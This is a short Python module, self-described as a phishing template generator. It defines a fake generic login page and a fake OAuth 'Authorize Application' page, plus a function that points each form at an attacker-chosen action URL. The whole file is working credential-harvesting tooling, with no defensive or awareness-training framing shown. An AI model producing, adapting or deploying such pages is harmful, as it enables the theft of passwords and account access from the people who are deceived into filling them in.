"""Phishing template generator."""
TEMPLATES = {
    "login": """<!DOCTYPE html>
<html><head><title>Login</title></head>
<body style="font-family:Arial;background:#f0f0f0">
<div style="max-width:400px;margin:50px auto;background:#fff;padding:30px;border-radius:8px;box-shadow:0 2px 10px rgba(0,0,0,.1)">
<h2>Sign In</h2>
<form action="{action}" method="POST">
<input name="username" placeholder="Username" style="width:100%;padding:10px;margin:5px 0;border:1px solid #ddd;border-radius:4px">
<input name="password" type="password" placeholder="Password" style="width:100%;padding:10px;margin:5px 0;border:1px solid #ddd;border-radius:4px">
<button style="width:100%;padding:10px;background:#007bff;color:#fff;border:none;border-radius:4px;cursor:pointer">Login</button>
</form></div></body></html>""",
    "oauth": """<!DOCTYPE html>
<html><head><title>Authorize</title></head>
<body><h2>Authorize Application</h2>
<p>{app} wants to access your account</p>
<form action="{action}" method="POST">
<button>Authorize</button></form></body></html>""",
}

def generate(template_type, action, app="App"):
    tmpl = TEMPLATES.get(template_type, TEMPLATES["login"])
    return tmpl.format(action=action, app=app)
